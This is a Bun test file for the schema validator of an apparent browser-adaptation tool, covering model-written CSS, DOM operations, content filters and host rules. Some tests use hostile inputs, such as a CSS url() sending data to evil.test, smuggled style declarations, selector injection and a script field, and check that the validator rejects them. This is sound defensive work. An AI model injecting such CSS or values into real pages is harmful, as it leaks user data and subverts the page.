import { expect, test } from "bun:test";
import { Adaptation, GlobalChange, Profile, Rule, ruleAppliesTo, filtersTargetKnownGroups, matchesHost, HostPattern, opsTargetKnownIds, scanCss } from "./index";

const valid = {
  id: "a1",
  sites: ["*.w3.org"],
  reason: { text: "Larger text for your reading preference", needId: "n1" },
  blocks: [{ block: "text_focus", fontScale: 1.3, lineHeight: 1.6, font: "atkinson", hide: [] }],
};

test("accepts a valid adaptation", () => {
  expect(Adaptation.safeParse(valid).success).toBe(true);
});

test("rejects unknown fields and duplicate blocks", () => {
  expect(Adaptation.safeParse({ ...valid, js: "alert(1)" }).success).toBe(false);
  expect(Adaptation.safeParse({ ...valid, blocks: [valid.blocks[0], valid.blocks[0]] }).success).toBe(false);
});

test("rejects exfiltrating css", () => {
  expect(Adaptation.safeParse({ ...valid, css: "body{background:url(https://evil.test/?c=1)}" }).success).toBe(false);
  expect(scanCss("body { font-size: 120%; }").ok).toBe(true);
});

test("host matching", () => {
  const p = HostPattern.parse("*.w3.org");
  expect(matchesHost(p, "www.w3.org")).toBe(true);
  expect(matchesHost(p, "w3.org")).toBe(true);
  expect(matchesHost(p, "evilw3.org")).toBe(false);
});

test("model-written css and snapshot ops", () => {
  const base = { id: "a2", sites: ["example.com"], reason: { text: "Invert for light sensitivity", needId: "n1" }, blocks: [] };
  expect(Adaptation.safeParse({ ...base, css: "html { filter: invert(1) hue-rotate(180deg); }" }).success).toBe(true);
  expect(Adaptation.safeParse({ ...base, css: "p::after { content: 'Click here'; }" }).success).toBe(false);
  expect(Adaptation.safeParse({ ...base, css: "@font-face { font-family: x; src: local(a); }" }).success).toBe(false);
  expect(Adaptation.safeParse({ ...base, ops: [{ op: "hide", ids: ["n3", "n9"] }] }).success).toBe(true);
  expect(Adaptation.safeParse({ ...base, ops: [{ op: "hide", ids: ["#ad"] }] }).success).toBe(false);
  expect(Adaptation.safeParse({ ...base, ops: [{ op: "style", ids: ["n3"], styles: { color: "red; background: url(x)" } }] }).success).toBe(false);
  expect(Adaptation.safeParse({ ...base, ops: [{ op: "style", ids: ["n3"], styles: { onclick: "x" } }] }).success).toBe(false);
});

test("ops must target ids the page actually had", () => {
  const a = Adaptation.parse({ id: "a3", sites: ["example.com"], reason: { text: "Hide ads", needId: "n1" }, blocks: [], ops: [{ op: "hide", ids: ["n3"] }] });
  expect(opsTargetKnownIds(a, new Set(["n1", "n3"]))).toBe(true);
  expect(opsTargetKnownIds(a, new Set(["n1"]))).toBe(false);
});

test("content filters target repeated item groups by keyword", () => {
  const base = { id: "a4", sites: ["www.youtube.com"], reason: { text: "Remove podcasts", needId: "request" }, blocks: [] };
  const filter = { itemSelector: "ytd-rich-item-renderer", keywords: ["podcast", "episode"], action: "hide" };
  const a = Adaptation.parse({ ...base, filters: [filter] });
  expect(filtersTargetKnownGroups(a, new Set(["ytd-rich-item-renderer"]))).toBe(true);
  expect(filtersTargetKnownGroups(a, new Set(["div.card"]))).toBe(false);
  expect(Adaptation.safeParse({ ...base, filters: [{ ...filter, itemSelector: "a{} body{display:none" }] }).success).toBe(false);
  expect(Adaptation.safeParse({ ...base, filters: [{ ...filter, keywords: [] }] }).success).toBe(false);
});

test("filters may omit the selector and carry a schedule; rules scope by host", () => {
  const f = { keywords: ["reel"], action: "hide", schedule: { days: ["mon"], start: "09:00", end: "17:00" } };
  const a = Adaptation.parse({ id: "a5", sites: ["www.instagram.com"], reason: { text: "No reels at work", needId: "request" }, blocks: [], filters: [f] });
  expect(filtersTargetKnownGroups(a, new Set())).toBe(true);
  const rule = Rule.parse({ id: "r1", text: "No reels at work", sites: ["*.instagram.com"], everywhere: false, filter: f, enabled: true, createdAt: 1 });
  expect(ruleAppliesTo(rule, "www.instagram.com")).toBe(true);
  expect(ruleAppliesTo(rule, "www.youtube.com")).toBe(false);
  expect(ruleAppliesTo({ ...rule, everywhere: true }, "www.youtube.com")).toBe(true);
  expect(ruleAppliesTo({ ...rule, enabled: false }, "www.instagram.com")).toBe(false);
});

test("profiles accept free-text preferences", () => {
  expect(Profile.safeParse({ version: 1, summary: "", needs: [{ id: "p1", kind: "preference", detail: "prefers dark mode", source: "onboarding" }] }).success).toBe(true);
});

test("global changes are safe on any site", () => {
  expect(GlobalChange.safeParse({ css: "html { filter: invert(1) hue-rotate(180deg); }", blocks: [], filters: [] }).success).toBe(true);
  expect(GlobalChange.safeParse({ blocks: [{ block: "text_scale", scale: 1.3 }], filters: [] }).success).toBe(true);
  expect(GlobalChange.safeParse({ blocks: [], filters: [{ keywords: ["shorts"], action: "hide" }] }).success).toBe(true);
  expect(GlobalChange.safeParse({ blocks: [], filters: [{ itemSelector: "ytd-rich-item-renderer", keywords: ["shorts"], action: "hide" }] }).success).toBe(false);
  expect(GlobalChange.safeParse({ css: "body{background:url(https://x.test)}", blocks: [], filters: [] }).success).toBe(false);
  expect(GlobalChange.safeParse({ blocks: [], filters: [] }).success).toBe(false);
});
